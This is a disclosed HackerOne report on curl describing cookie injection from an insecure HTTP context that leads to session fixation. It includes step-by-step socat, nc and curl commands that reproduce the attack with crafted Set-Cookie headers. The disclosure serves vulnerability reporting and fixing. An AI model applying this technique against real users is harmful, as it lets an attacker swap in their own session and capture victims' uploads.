# Cookie injection from non-secure context

## Report Details
- **Report ID**: 1560324
- **URL**: https://hackerone.com/reports/1560324
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-05-05T17:48:16.396Z
- **Disclosed**: 2022-05-13T06:44:08.351Z

## Reporter
- **Username**: nyymi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
## Summary:

Curl allows injecting cookies over insecure HTTP connection that will then be sent to the target site when connecting over HTTPS.

As documented in lib/cookie.c https://github.com/curl/curl/blob/a04f0b961333e1a19848d073d8c7db9c20b2a371/lib/cookie.c#L1039 this should not be possible:
```
            /*
             * A non-secure cookie may not overlay an existing secure cookie.
             * For an existing cookie "a" with path "/login", refuse a new
             * cookie "a" with for example path "/login/en", while the path
             * "/loginhelper" is ok.
             */
```

This will allow session fixation (CWE-384) attack where the attacker replaces the session of the victim with their own. If the victim performs for example upload operations the upload will be sent to the account controlled bit he attacker.

This attack requires that the application in question does or  can be coaxed to make accesses to the same host over insecure HTTP connection. The attacker needs to either perform Man in the Middle attack to these insecure connections, or be able to host a HTTP server on another port on the same host.

## Steps To Reproduce:
1. Set up a HTTPS server that will respond to requests setting the SESSIONID cookie. This simulates the victim accessing the site normally. Note that the cookie has *secure* attribute:
 ```
echo -ne "HTTP/1.1 200 OK\r\nSet-Cookie: SESSIONID=victimstoken; secure\r\nContent-Length: 0\r\n\r\n" | socat STDIN OPENSSL-LISTEN:9999,commonname=somesite.tld,reuseaddr,verify=0,key=privkey.pem,cert=fullchain.pem
 ```

2. Access the site with curl to simulate a victim login:
 ```
 curl -c cookies.txt -b cookies.txt https://somesite.tld:9999/
 ```

3. Simulate the attacker either performing a MitM attack or being able to host HTTP on another port on the same host:

 ```
 echo -ne "HTTP/1.1 200 OK\r\nSet-Cookie: SESSIONID=hackerstoken; domain=somesite.tld\r\nContent-Length: 0\r\n\r\n" | nc -v -l -p 3333
 ```

4. Simulate the victim visiting the attacker controlled content:

 ```
 curl -c cookies.txt -b cookies.txt http://somesite.tld:3333/
 ```

5. Start HTTPS server that will dump the Cookie headers sent by libcurl:
 ```
 socat OPENSSL-LISTEN:9999,commonname=somesite.tld,reuseaddr,verify=0,key=privkey.pem,cert=fullchain.pem STDOUT
 ```

6. Simulate the victim accessing the target site again:
  ```
 curl -c cookies.txt -b cookies.txt https://somesite.tld:9999/
 ```

The following cookies are now sent by curl:
`Cookie: SESSIONID=victimstoken; SESSIONID=hackerstoken`

The order the cookies appears to depend on the order of the lines in cookie store. Depending on how the victim site interpreted the multiple SESSIONID cookies the attacker may want to try to inject the cookie before login by the victim, or after the login.

After successful attack the cookie.txt looks like this:
```
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

.somesite.tld    TRUE    /       FALSE   0       SESSIONID       hackerstoken
somesite.tld     FALSE   /       TRUE    0       SESSIONID       victimstoken
```

This is CWE-384: Session Fixation.

## Impact

Cookie injection leading to CWE-384: Session Fixation and/or other similar attacks.

## Attachments
No attachments
